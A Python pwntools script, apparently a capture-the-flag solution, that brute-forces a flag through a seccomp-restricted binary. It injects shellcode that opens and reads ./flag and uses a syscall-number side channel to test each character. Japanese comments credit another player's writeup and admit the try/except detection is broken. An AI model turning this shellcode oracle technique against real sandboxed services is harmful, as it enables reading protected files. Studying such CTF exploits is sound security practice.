#!/usr/bin/env python3
"""
このスクリプトはJor(#7505)さんのwriteupを参考にしています
Thanks Jor for the writeup.
あとtry exceptがうまく動かないのでしばらく放置.
"""
from pwn import *
import warnings
warnings.simplefilter("ignore")

elf = context.binary = ELF("chall")

chars = ' {}_@0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?[\\]^`~'
flag = "SEE{"

index = 4

while '}' not in flag :
    for c in chars:
        target = elf.process()
        if args.GDB:
            gdb.attach(target, gdbscript="b seccomp_load")

        print("Tring:", c, index)
        target.recvuntil("======================================")
        target.recvuntil("======================================")

        target.send(asm('mov esi,edx;xor edi,edi;syscall;'))    


        #ローカル環境でやる場合は./flagにしないとそもそも開けない
        payload = asm(
            shellcraft.pushstr("./flag") + 
            shellcraft.open('rsp', 0, 0) +
            shellcraft.read('rax','rsp',0x100) +
            'movzx rax, byte ptr [rsp+{}];'.format(index) +
            'xor rax, {};'.format(ord(c)) + 
            'xor rdi, rdi;' +
            'syscall;'
        )
        """
        flagから読み取った文字と比較用文字でxorを取った後read(0)を呼び出している
        readが呼び出せるということはflagとその文字が一致している(xor = 0)ことになる
        ただしopen(2)の場合もあるので気を付けること
        """
        target.sendline(b"AAAAAA" + payload)
        
        #この部分がなぜかうまく動かない,全部tryを実行してしまう
        try:
            target.recv(timeout=1)
            flag += c
            index += 1
            print("Found:",flag)
            break
        except Exception as e:
            continue